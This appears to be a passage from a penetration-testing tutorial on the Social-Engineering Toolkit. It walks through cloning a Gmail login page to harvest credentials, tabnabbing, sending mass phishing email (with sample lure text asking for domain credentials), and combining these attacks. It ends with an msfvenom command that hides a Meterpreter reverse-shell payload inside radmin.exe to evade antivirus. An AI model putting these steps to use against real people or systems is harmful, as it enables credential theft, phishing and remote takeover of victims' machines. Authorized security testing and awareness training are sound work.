### Credential Harvester Attack Method
The Credential Harvester Attack Method is designed to create websites that trick users into entering their credentials. This method leverages the user's trust in familiar web interfaces, such as login pages, to capture sensitive information.

### Tabnabbing Attack Method
The Tabnabbing Attack Method exploits the common user behavior of having multiple browser tabs open. When a user first opens the attack page, it displays a "Please wait" message. The user, assuming the page is loading, switches to another tab. In the background, the attack page then loads a malicious site (which can be a clone of any website) with the goal of tricking the user into entering their credentials or interacting with the malicious site. The assumption is that the user will use the first tab they encounter that looks legitimate.

### Setting Up the Credential Harvester Attack

1. **Choose the Credential Harvester Attack Method:**
   - Select option 3 from the menu.
   - You will be prompted to choose a type of website. Options include:
     1. Web Templates
     2. Site Cloner
     3. Custom Import
   - Choose option 1 to use a SET template.

2. **Enter the IP Address:**
   - Enter the IP address for the website to post credentials back to. For local testing, you can use the Kali virtual machine's local IP address. For remote attacks, an Internet-facing IP address is required.
   - Example: `IP Address for the POST back in Harvester: 192.168.20.9`

3. **Select a Template:**
   - Choose a template that includes a login field to trick users into entering their credentials. For example, select the Gmail template (option 2).
   - Example: `set:webattack> Select a template: 2`
   - SET will start a web server with a fake Gmail page, a clone of the actual Gmail page.

4. **Test the Setup:**
   - Browse to the cloned Gmail site at the Kali Linux web server and enter some credentials.
   - After entering the credentials, you should be redirected to the real Gmail site. To the user, it will seem like they entered their password incorrectly.
   - Back in SET, you should see the captured credentials, including the email and password fields.

### Mass Email Attacks

1. **Prepare the Email List:**
   - Create a file containing the email addresses of the targets, one per line.
   - Example: `root@kali:~# cat emails.txt`
     ```
     PI:EMAIL
     PI:EMAIL
     PI:EMAIL
     ```

2. **Return to the Main Menu:**
   - Use option 99 to return to the main SET Social-Engineering Attacks menu.
   - Choose option 5, Mass Mailer Attack.

3. **Import the Email List:**
   - Select option 2 to import the email list.
   - Enter the path to the email address file.
   - Example: `set:mailer> 2`
     ```
     Path to the file to import into SET: /root/emails.txt
     ```

4. **Choose the Email Server:**
   - Select the email server to use. For example, choose Gmail (option 1).
   - Enter your Gmail credentials when prompted.
   - Example: 
     ```
     set:phishing> 1
     Your gmail email address: PI:EMAIL
     The FROM NAME the user will see: Georgia Weidman
     Email password: [your password]
     Flag this message/s as high priority? [yes|no]: no
     ```

5. **Create the Email:**
   - Enter the subject and body of the email.
   - Use HTML to create a convincing link that appears to go to a legitimate site but actually redirects to the attacker-controlled site.
   - Example:
     ```
     set:phishing> Email subject: Company Web Portal
     set:phishing> Send the message as html or plain? 'h' or 'p': h
     Enter the body of the message, type END (capitals) when finished: All,
     We are adding a new company web portal. Please go to http://www.bulbsecurity.com/webportal and use your Windows domain credentials to log in.
     Bulb Security Administrator
     END
     ```

6. **Send the Emails:**
   - Press `ctrl-c` to send the email to each address in the list.
   - Recipients will see the email with the provided subject and body, and the link will redirect them to the attacker-controlled site.

### Multipronged Attacks

To combine credential harvesting and phishing emails, follow these steps:

1. **Modify the SET Configuration:**
   - Open the SET configuration file (`/usr/share/set/config/set_config`) in a text editor.
   - Change the `WEB_ATTACK_EMAIL` option to `ON`.

2. **Run the Credential Harvesting Attack:**
   - Instead of using a template, clone one of the client’s web pages if they have a login site.
   - If the client uses a web page without a login, use the Custom Import option to build a page that looks like the employee’s web page with a login form added.

### Summary

In this chapter, we explored several social-engineering attacks that can be automated with the Social-Engineering Toolkit (SET). These include credential harvesting, tabnabbing, and mass email attacks. By combining these methods, you can create effective multipronged attacks to gather credentials and test the security awareness of your client’s employees. Additionally, SET can be used to create other types of attacks, such as USB sticks, QR codes, and rogue wireless access points.

### Bypassing Antivirus Applications

When conducting penetration tests, clients often have antivirus solutions in place. To avoid detection, you can use techniques such as memory-corruption exploits and trojans. Here, we will focus on creating trojans using Msfvenom.

### Creating a Trojan with Msfvenom

1. **Use Msfvenom to Embed a Payload:**
   - Use the `-x` flag to specify a custom executable file as a template.
   - Use the `-k` flag to keep the template behavior and inject the payload as a new thread.
   - Example:
     ```
     root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
     ```

2. **Explanation:**
   - The `-p` option specifies the payload to generate.
   - `LHOST` and `LPORT` options set the IP address and port for the callback.
   - The `-x` option selects the executable to embed the payload in.
   - The `-k` option ensures the original executable runs normally while the payload runs in the background.

By following these steps, you can create a trojan that appears normal to the user but sends a Meterpreter session to the attacker in the background.
